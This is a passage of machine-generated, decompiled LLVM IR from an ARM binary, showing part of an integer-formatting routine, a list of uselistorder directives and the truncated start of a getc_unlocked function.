  %v5_15774 = icmp slt i32 %v4_15774, 0
  store i1 %v5_15774, i1* %cpsr_v.global-to-local, align 1
  %v6_15774 = icmp slt i32 %v1_15774, 0
  store i1 %v6_15774, i1* %cpsr_n.global-to-local, align 1
  %v7_15774 = icmp eq i32 %v0_15774, 103
  store i1 %v7_15774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15774, label %dec_label_pc_1577c, label %dec_label_pc_15784

dec_label_pc_1577c:                               ; preds = %.thread42
  %v0_1577c = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1577c = icmp slt i32 %v0_1577c, 0
  store i1 %v1_1577c, i1* %cpsr_n.global-to-local, align 1
  %v2_1577c = icmp eq i32 %v0_1577c, 0
  store i1 %v2_1577c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1577c, label %dec_label_pc_157ac, label %dec_label_pc_15784

dec_label_pc_15784:                               ; preds = %.thread42, %dec_label_pc_1577c
  %v0_15784 = load i32, i32* %ip.global-to-local, align 4
  %v1_15784 = load i32, i32* %r1.global-to-local, align 4
  %v2_15784 = sub i32 %v1_15784, %v0_15784
  store i32 %v2_15784, i32* %r3.global-to-local, align 4
  %v1_15788 = load i32, i32* %r8.global-to-local, align 4
  %v2_15788 = sub i32 %v2_15784, %v1_15788
  %v4_15788 = xor i32 %v1_15788, %v2_15784
  %v5_15788 = xor i32 %v2_15788, %v2_15784
  %v6_15788 = and i32 %v5_15788, %v4_15788
  %v7_15788 = icmp slt i32 %v6_15788, 0
  store i1 %v7_15788, i1* %cpsr_v.global-to-local, align 1
  %v8_15788 = icmp slt i32 %v2_15788, 0
  store i1 %v8_15788, i1* %cpsr_n.global-to-local, align 1
  %v9_15788 = icmp eq i32 %v2_15784, %v1_15788
  store i1 %v9_15788, i1* %cpsr_z.global-to-local, align 1
  %v2_1578c = xor i1 %v8_15788, %v7_15788
  br i1 %v2_1578c, label %dec_label_pc_15790, label %dec_label_pc_157ac

dec_label_pc_15790:                               ; preds = %dec_label_pc_15784
  %v2_15790 = sub i32 %v1_15788, %v2_15784
  %v2_15794 = add i32 %v1_15794, 4
  %v3_15794 = inttoptr i32 %v2_15794 to i32*
  store i32 %v2_15790, i32* %v3_15794, align 4
  store i32 ptrtoint (i32* @global_var_1dc73.841 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_157a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_157a0 = inttoptr i32 %v1_157a0 to i32*
  store i32 176, i32* %v2_157a0, align 4
  %v0_157a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_157a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_157a4 = add i32 %v1_157a4, 8
  %v3_157a4 = inttoptr i32 %v2_157a4 to i32*
  store i32 %v0_157a4, i32* %v3_157a4, align 4
  %v0_157a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_157a8 = add i32 %v0_157a8, 12
  store i32 %v1_157a8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_157ac

dec_label_pc_157ac:                               ; preds = %dec_label_pc_15784, %dec_label_pc_1577c, %dec_label_pc_15790
  %v1_15840.pre.pre = phi i32 [ %v1_15794, %dec_label_pc_15784 ], [ %v1_15794, %dec_label_pc_1577c ], [ %v1_157a8, %dec_label_pc_15790 ]
  %v0_157ac = load i32, i32* %sl.global-to-local, align 4
  %v1_157ac = add i32 %v0_157ac, -102
  %v3_157ac = sub i32 101, %v0_157ac
  %v4_157ac = and i32 %v3_157ac, %v0_157ac
  %v5_157ac = icmp slt i32 %v4_157ac, 0
  store i1 %v5_157ac, i1* %cpsr_v.global-to-local, align 1
  %v6_157ac = icmp slt i32 %v1_157ac, 0
  store i1 %v6_157ac, i1* %cpsr_n.global-to-local, align 1
  %v7_157ac = icmp eq i32 %v0_157ac, 102
  store i1 %v7_157ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_157ac, label %dec_label_pc_15834, label %dec_label_pc_157b4

dec_label_pc_157b4:                               ; preds = %dec_label_pc_157ac
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_157b8 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_157b8 = icmp slt i32 %v0_157b8, 0
  store i1 %v1_157b8, i1* %cpsr_n.global-to-local, align 1
  %v2_157b8 = icmp eq i32 %v0_157b8, 0
  store i1 %v2_157b8, i1* %cpsr_z.global-to-local, align 1
  %v4_157bc = zext i8 %stack_var_-66.0108114 to i32
  store i32 %v4_157bc, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-51, align 4
  %v4_157cc = sub i32 0, %v0_157b8
  %storemerge140 = select i1 %v1_157b8, i32 %v4_157cc, i32 %v0_157b8
  %tmp239 = ashr i32 %v0_157b8, 31
  %tmp240 = and i32 %tmp239, 2
  %tmp241 = add nuw nsw i32 %tmp240, 43
  store i32 %storemerge140, i32* %r4.global-to-local, align 4
  store i32 %tmp241, i32* %sl.global-to-local, align 4
  %v2_157d4 = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_157d4, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_157dc

dec_label_pc_157dc:                               ; preds = %dec_label_pc_1580c, %dec_label_pc_157dc, %dec_label_pc_157b4
  %v2_157f4 = phi i32 [ %v2_157d4, %dec_label_pc_157b4 ], [ %v6_157f4, %dec_label_pc_157dc ], [ %v6_157f4, %dec_label_pc_1580c ]
  %v0_157f0 = phi i32 [ %storemerge140, %dec_label_pc_157b4 ], [ %v2_157f8, %dec_label_pc_157dc ], [ %v2_157f8, %dec_label_pc_1580c ]
  %v2_157e4 = srem i32 %v0_157f0, 10
  %v1_157e8 = add nsw i32 %v2_157e4, 48
  store i32 %v1_157e8, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_157f0, i32* %r0.global-to-local, align 4
  %v1_157f4 = trunc i32 %v1_157e8 to i8
  %v3_157f4 = add i32 %v2_157f4, -1
  %v4_157f4 = inttoptr i32 %v3_157f4 to i8*
  store i8 %v1_157f4, i8* %v4_157f4, align 1
  %v5_157f4 = load i32, i32* %r5.global-to-local, align 4
  %v6_157f4 = add i32 %v5_157f4, -1
  store i32 %v6_157f4, i32* %r5.global-to-local, align 4
  %v0_157f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_157f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_157f8 = sdiv i32 %v0_157f8, %v1_157f8
  store i32 %v2_157f8, i32* %r0.global-to-local, align 4
  %v0_157fc = load i32, i32* %r7.global-to-local, align 4
  %v1_157fc = add i32 %v0_157fc, 1
  store i32 %v1_157fc, i32* %r7.global-to-local, align 4
  %v1_15800 = add i32 %v0_157fc, -2
  %v3_15800 = sub i32 1, %v0_157fc
  %v4_15800 = and i32 %v3_15800, %v1_157fc
  %v5_15800 = icmp slt i32 %v4_15800, 0
  store i1 %v5_15800, i1* %cpsr_v.global-to-local, align 1
  %v6_15800 = icmp slt i32 %v1_15800, 0
  store i1 %v6_15800, i1* %cpsr_n.global-to-local, align 1
  %v7_15800 = icmp eq i32 %v1_157fc, 3
  store i1 %v7_15800, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_157f8, i32* %r4.global-to-local, align 4
  %v7_15808 = icmp slt i32 %v1_157fc, 4
  br i1 %v7_15808, label %dec_label_pc_157dc, label %dec_label_pc_1580c

dec_label_pc_1580c:                               ; preds = %dec_label_pc_157dc
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1580c = icmp slt i32 %v2_157f8, 0
  store i1 %v1_1580c, i1* %cpsr_n.global-to-local, align 1
  %v2_1580c = icmp eq i32 %v2_157f8, 0
  store i1 %v2_1580c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1580c, label %dec_label_pc_15814, label %dec_label_pc_157dc

dec_label_pc_15814:                               ; preds = %dec_label_pc_1580c
  %v1_15814 = add i32 %v5_157f4, -2
  store i32 %v1_15814, i32* %r3.global-to-local, align 4
  %v0_15818 = load i32, i32* %sl.global-to-local, align 4
  %v1_15818 = trunc i32 %v0_15818 to i8
  %v4_15818 = inttoptr i32 %v1_15814 to i8*
  store i8 %v1_15818, i8* %v4_15818, align 1
  %v0_1581c = load i32, i32* %r3.global-to-local, align 4
  %v1_1581c = add i32 %v0_1581c, -1
  store i32 %v1_1581c, i32* %r2.global-to-local, align 4
  %v0_15820 = load i32, i32* %r8.global-to-local, align 4
  %v1_15820 = trunc i32 %v0_15820 to i8
  %v4_15820 = inttoptr i32 %v1_1581c to i8*
  store i8 %v1_15820, i8* %v4_15820, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_15828 = load i32, i32* %r6.global-to-local, align 4
  %v1_15828 = inttoptr i32 %v0_15828 to i32*
  store i32 112, i32* %v1_15828, align 4
  %v3_15828 = add i32 %v0_15828, 4
  %v4_15828 = inttoptr i32 %v3_15828 to i32*
  %v5_15828 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_15828, i32* %v4_15828, align 4
  %v0_1582c = load i32, i32* %r2.global-to-local, align 4
  %v1_1582c = load i32, i32* %r6.global-to-local, align 4
  %v2_1582c = add i32 %v1_1582c, 8
  %v3_1582c = inttoptr i32 %v2_1582c to i32*
  store i32 %v0_1582c, i32* %v3_1582c, align 4
  %v0_15830 = load i32, i32* %r6.global-to-local, align 4
  %v1_15830 = add i32 %v0_15830, 12
  store i32 %v1_15830, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15834

dec_label_pc_15834:                               ; preds = %dec_label_pc_157ac, %.thread105, %dec_label_pc_15814
  %v1_15840.pre = phi i32 [ %v2_153ac, %.thread105 ], [ %v1_15830, %dec_label_pc_15814 ], [ %v1_15840.pre.pre, %dec_label_pc_157ac ]
  %v2_15834 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_15834, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15838

dec_label_pc_15838:                               ; preds = %dec_label_pc_15838, %dec_label_pc_15834
  %v0_15838 = phi i32 [ %v2_15834, %dec_label_pc_15834 ], [ %v4_15838, %dec_label_pc_15838 ]
  %stack_var_-188.0 = phi i32 [ %v3_152e4, %dec_label_pc_15834 ], [ %v2_15844, %dec_label_pc_15838 ]
  %v1_15838 = inttoptr i32 %v0_15838 to i32*
  %v2_15838 = load i32, i32* %v1_15838, align 4
  store i32 %v2_15838, i32* %r3.global-to-local, align 4
  %v4_15838 = add i32 %v0_15838, 12
  store i32 %v4_15838, i32* %r2.global-to-local, align 4
  %v3_15840 = icmp ult i32 %v4_15838, %v1_15840.pre
  %v2_15844 = sub i32 %stack_var_-188.0, %v2_15838
  store i32 %v2_15844, i32* %ip.global-to-local, align 4
  br i1 %v3_15840, label %dec_label_pc_15838, label %dec_label_pc_15850

dec_label_pc_15850:                               ; preds = %dec_label_pc_15838
  %v3_15850 = load i8, i8* %stack_var_-50, align 1
  %v4_15850 = sext i8 %v3_15850 to i32
  store i32 %v4_15850, i32* %r3.global-to-local, align 4
  store i32 %v4_15850, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15854 = icmp slt i8 %v3_15850, 0
  store i1 %v1_15854, i1* %cpsr_n.global-to-local, align 1
  %v2_15854 = icmp eq i8 %v3_15850, 0
  store i1 %v2_15854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15854, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_15850
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_15850, %bb225
  %v1_158a0 = phi i32 [ %v4_15850, %dec_label_pc_15850 ], [ 1, %bb225 ]
  %v2_1585c = sub i32 %v2_15844, %v1_158a0
  store i32 %v2_1585c, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_15864 = ptrtoint i8* %stack_var_-50 to i32
  store i32 %v2_15864, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15868 = icmp slt i32 %v2_1585c, 0
  store i1 %v1_15868, i1* %cpsr_n.global-to-local, align 1
  %v2_15868 = icmp eq i32 %v2_1585c, 0
  store i1 %v2_15868, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-184, align 4
  %tmp227 = icmp slt i32 %v2_1585c, 1
  br i1 %tmp227, label %dec_label_pc_158c8, label %dec_label_pc_1587c

dec_label_pc_1587c:                               ; preds = %bb226
  %v0_1587c = load i32, i32* %fp.global-to-local, align 4
  %v1_1587c = add i32 %v0_1587c, 12
  %v2_1587c = inttoptr i32 %v1_1587c to i32*
  %v3_1587c = load i32, i32* %v2_1587c, align 4
  store i32 %v3_1587c, i32* %r3.global-to-local, align 4
  %v1_15880 = and i32 %v3_1587c, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15880 = icmp eq i32 %v1_15880, 0
  store i1 %v2_15880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15880, label %dec_label_pc_15898, label %dec_label_pc_15888

dec_label_pc_15888:                               ; preds = %dec_label_pc_1587c
  store i32 ptrtoint (i32* @global_var_1dc73.841 to i32), i32* %r3.global-to-local, align 4
  %v1_1588c = add i32 %v1_15840.pre, 12
  store i32 %v1_1588c, i32* %r5.global-to-local, align 4
  %v1_15890 = inttoptr i32 %v1_15840.pre to i32*
  store i32 160, i32* %v1_15890, align 4
  %v3_15890 = add i32 %v1_15840.pre, 4
  %v4_15890 = inttoptr i32 %v3_15890 to i32*
  %v5_15890 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15890, i32* %v4_15890, align 4
  %v6_15890 = add i32 %v1_15840.pre, 8
  %v7_15890 = inttoptr i32 %v6_15890 to i32*
  %v8_15890 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_15890, i32* %v7_15890, align 4
  br label %dec_label_pc_158cc

dec_label_pc_15898:                               ; preds = %dec_label_pc_1587c
  %v1_15898 = add i32 %v0_1587c, 16
  %v2_15898 = inttoptr i32 %v1_15898 to i32*
  %v3_15898 = load i32, i32* %v2_15898, align 4
  store i32 %v3_15898, i32* %r3.global-to-local, align 4
  %v1_1589c = add i32 %v3_15898, -48
  %v3_1589c = sub i32 47, %v3_15898
  %v4_1589c = and i32 %v3_1589c, %v3_15898
  %v5_1589c = icmp slt i32 %v4_1589c, 0
  store i1 %v5_1589c, i1* %cpsr_v.global-to-local, align 1
  %v6_1589c = icmp slt i32 %v1_1589c, 0
  store i1 %v6_1589c, i1* %cpsr_n.global-to-local, align 1
  %v7_1589c = icmp eq i32 %v3_15898, 48
  store i1 %v7_1589c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1589c, label %dec_label_pc_158ac, label %bb228

bb228:                                            ; preds = %dec_label_pc_15898
  store i32 %v2_15844, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_158c8

dec_label_pc_158ac:                               ; preds = %dec_label_pc_15898
  %v3_158ac = load i32, i32* %stack_var_-168, align 4
  store i32 %v1_15840.pre, i32* %r5.global-to-local, align 4
  %v2_158b4 = add i32 %v3_158ac, %v2_1585c
  store i32 %v2_158b4, i32* %r3.global-to-local, align 4
  store i32 %v2_158b4, i32* %stack_var_-168, align 4
  br label %dec_label_pc_158cc

dec_label_pc_158c0:                               ; preds = %dec_label_pc_158d4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15904

dec_label_pc_158c8:                               ; preds = %bb228, %bb226
  store i32 %v1_15840.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_158cc

dec_label_pc_158cc:                               ; preds = %dec_label_pc_158ac, %dec_label_pc_15888, %dec_label_pc_158c8
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_152c0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_158d4

dec_label_pc_158d4:                               ; preds = %dec_label_pc_158fc, %dec_label_pc_158cc
  %v0_158d4 = phi i32 [ %v1_158f4, %dec_label_pc_158fc ], [ %v2_152c0, %dec_label_pc_158cc ]
  %v1_158d4 = inttoptr i32 %v0_158d4 to i32*
  %v2_158d4 = load i32, i32* %v1_158d4, align 4
  store i32 %v2_158d4, i32* %r1.global-to-local, align 4
  %v3_158d4 = add i32 %v0_158d4, 4
  %v4_158d4 = inttoptr i32 %v3_158d4 to i32*
  %v5_158d4 = load i32, i32* %v4_158d4, align 4
  store i32 %v5_158d4, i32* %r2.global-to-local, align 4
  %v6_158d4 = add i32 %v0_158d4, 8
  %v7_158d4 = inttoptr i32 %v6_158d4 to i32*
  %v8_158d4 = load i32, i32* %v7_158d4, align 4
  store i32 %v8_158d4, i32* %r3.global-to-local, align 4
  %v2_158d8 = load i32, i32* %stack_var_-192, align 4
  store i32 %v2_158d8, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %ip.global-to-local, align 4
  store i32 88296, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_158e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_158e8 = add i32 %v0_158e8, 4
  %v2_158e8 = inttoptr i32 %v1_158e8 to i32*
  %v3_158e8 = load i32, i32* %v2_158e8, align 4
  store i32 %v3_158e8, i32* %r3.global-to-local, align 4
  %v0_158ec = load i32, i32* %r0.global-to-local, align 4
  %v2_158ec = sub i32 %v0_158ec, %v3_158e8
  %v4_158ec = xor i32 %v0_158ec, %v3_158e8
  %v5_158ec = xor i32 %v2_158ec, %v0_158ec
  %v6_158ec = and i32 %v5_158ec, %v4_158ec
  %v7_158ec = icmp slt i32 %v6_158ec, 0
  store i1 %v7_158ec, i1* %cpsr_v.global-to-local, align 1
  %v8_158ec = icmp slt i32 %v2_158ec, 0
  store i1 %v8_158ec, i1* %cpsr_n.global-to-local, align 1
  %v9_158ec = icmp eq i32 %v0_158ec, %v3_158e8
  store i1 %v9_158ec, i1* %cpsr_z.global-to-local, align 1
  %v0_158f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_158f0 = add i32 %v0_158f0, %v0_158ec
  store i32 %v2_158f0, i32* %r6.global-to-local, align 4
  %v1_158f4 = add i32 %v0_158e8, 12
  store i32 %v1_158f4, i32* %r4.global-to-local, align 4
  br i1 %v9_158ec, label %dec_label_pc_158fc, label %dec_label_pc_158c0

dec_label_pc_158fc:                               ; preds = %dec_label_pc_158d4
  %v1_158fc = load i32, i32* %r5.global-to-local, align 4
  %v2_158fc = sub i32 %v1_158f4, %v1_158fc
  %v3_158fc = icmp ult i32 %v1_158f4, %v1_158fc
  %v4_158fc = xor i32 %v1_158fc, %v1_158f4
  %v5_158fc = xor i32 %v2_158fc, %v1_158f4
  %v6_158fc = and i32 %v5_158fc, %v4_158fc
  %v7_158fc = icmp slt i32 %v6_158fc, 0
  store i1 %v7_158fc, i1* %cpsr_v.global-to-local, align 1
  %v8_158fc = icmp slt i32 %v2_158fc, 0
  store i1 %v8_158fc, i1* %cpsr_n.global-to-local, align 1
  %v9_158fc = icmp eq i32 %v1_158f4, %v1_158fc
  store i1 %v9_158fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_158fc, label %dec_label_pc_158d4, label %dec_label_pc_15904

dec_label_pc_15904:                               ; preds = %dec_label_pc_158fc, %dec_label_pc_158c0
  %v0_15904 = phi i32 [ -1, %dec_label_pc_158c0 ], [ %v2_158f0, %dec_label_pc_158fc ]
  store i32 %v0_15904, i32* %r0.global-to-local, align 4
  %v8_15910 = load i32, i32* %stack_var_-36, align 4
  store i32 %v8_15910, i32* @r6, align 4
  store i32 %v6_152ac, i32* @r7, align 4
  store i32 %v9_152ac, i32* @r8, align 4
  store i32 %v12_152ac, i32* @sb, align 4
  store i32 %v15_152ac, i32* @sl, align 4
  store i32 %v18_152ac, i32* @fp, align 4
  ret i32 %v0_15904

; uselistorder directives
  uselistorder i32 %v0_15904, { 1, 0 }
  uselistorder i32 %v2_158fc, { 1, 0 }
  uselistorder i32 %v1_158fc, { 2, 0, 1, 3 }
  uselistorder i32 %v1_158f4, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_158ec, { 1, 0 }
  uselistorder i32 %v0_158ec, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_158e8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_158d4, { 2, 1, 0 }
  uselistorder i32 %v3_15898, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_15844, { 0, 1, 3, 2 }
  uselistorder i32 %v4_15838, { 1, 2, 0 }
  uselistorder i32 %v0_15838, { 1, 0 }
  uselistorder i32 %v1_15840.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_157f8, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_157f4, { 2, 1, 0 }
  uselistorder i32 %storemerge140, { 1, 0 }
  uselistorder i32 %v0_157b8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_157ac, { 3, 0, 1, 2 }
  uselistorder i32 %v2_15788, { 1, 0 }
  uselistorder i32 %v1_15788, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15784, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_1577c, { 1, 0 }
  uselistorder i32 %v0_15774, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1575c, { 1, 0 }
  uselistorder i32 %v1_15738, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15738, { 1, 0, 2 }
  uselistorder i32 %v1_15714, { 0, 2, 1 }
  uselistorder i32 %v0_15710, { 3, 0, 1, 2 }
  uselistorder i1 %v2_156f4, { 2, 1, 0 }
  uselistorder i32 %v2_1564c, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_1563c, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v0_156e0, { 3, 0, 4, 7, 5, 6, 9, 1, 2, 8 }
  uselistorder i32 %v0_155e8, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_155d0, { 1, 0 }
  uselistorder i32 %v2_155c8, { 1, 2, 0 }
  uselistorder i32 %v1_155bc, { 1, 0 }
  uselistorder i32 %v0_155bc, { 2, 3, 5, 0, 4, 1 }
  uselistorder i32 %v1_155b4, { 1, 0, 2 }
  uselistorder i32 %v0_155ac, { 3, 0, 1, 2 }
  uselistorder i1 %v3_15590, { 1, 0 }
  uselistorder i32 %v2_15590, { 1, 0 }
  uselistorder i32 %v2_1558c, { 2, 1, 3, 4, 6, 0, 7, 5, 8 }
  uselistorder i1 %v7_15578, { 1, 0 }
  uselistorder i32 %v1_1557c, { 2, 1, 0 }
  uselistorder i1 %v2_1556c, { 1, 0 }
  uselistorder i32 %v0_15568, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_15550, { 1, 0 }
  uselistorder i32 %v1_15544, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v2_154fc, { 1, 2, 0 }
  uselistorder i32 %v2_154f8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_154f8, { 1, 0, 2 }
  uselistorder i1 %v2_154e4, { 1, 0 }
  uselistorder i32 %v0_154dc, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_154ec, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_154cc, { 1, 0 }
  uselistorder i32 %v0_154bc, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i1 %v6_154b4, { 1, 0 }
  uselistorder i1 %v5_154b4, { 1, 0 }
  uselistorder i32 %v0_154b0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_154a4, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_154a0, { 0, 1, 3, 5, 2, 4 }
  uselistorder i32 %v4_15454, { 1, 0 }
  uselistorder i32 %v3_15454, { 1, 0 }
  uselistorder i32 %v0_15388, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_152c0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_152bc, { 1, 0 }
  uselistorder i32* %stack_var_-86, { 1, 2, 0 }
  uselistorder i32* %stack_var_-51, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-50, { 1, 3, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 8, 2, 3, 9, 4, 5, 6, 7 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 6, 2, 3, 7, 4, 8 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 7, 8, 9, 6, 10, 4, 11, 12, 5, 13 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 16, 17, 19, 20, 21, 22, 23, 24, 43, 25, 26, 30, 27, 28, 29, 31, 41, 32, 33, 34, 35, 37, 36, 38, 39, 40, 42, 52, 44, 45, 53, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 1, 7, 8, 15, 17, 18, 16, 9, 10, 14, 11, 12, 13, 19, 2, 20, 21, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 11, 9, 10, 12 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 50, 26, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 47, 17, 18, 19, 20, 21, 22, 23, 24, 25, 48, 26, 27, 28, 29, 46, 30, 31, 32, 33, 34, 35, 36, 45, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 50, 18, 19, 20, 21, 22, 23, 24, 25, 26, 51, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5, 6 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i32 95, { 1, 2, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_158cc, { 2, 0, 1 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %dec_label_pc_15834, { 2, 0, 1 }
  uselistorder label %dec_label_pc_157ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15784, { 1, 0 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %dec_label_pc_1575c, { 1, 0 }
  uselistorder label %dec_label_pc_15738, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1571c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_156f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_156ec, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15610, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %dec_label_pc_15600, { 1, 0 }
  uselistorder label %dec_label_pc_155f4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb202, { 1, 0 }
  uselistorder label %bb200, { 1, 0 }
  uselistorder label %.preheader, { 3, 2, 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %dec_label_pc_1551c, { 2, 0, 1 }
  uselistorder label %bb194, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb187, { 1, 0 }
  uselistorder label %.thread105, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %bb182, { 1, 0 }
  uselistorder label %bb180, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_15914 = load i32, i32* @r4, align 4
  store i32 %v3_15914, i32* %stack_var_-8, align 4
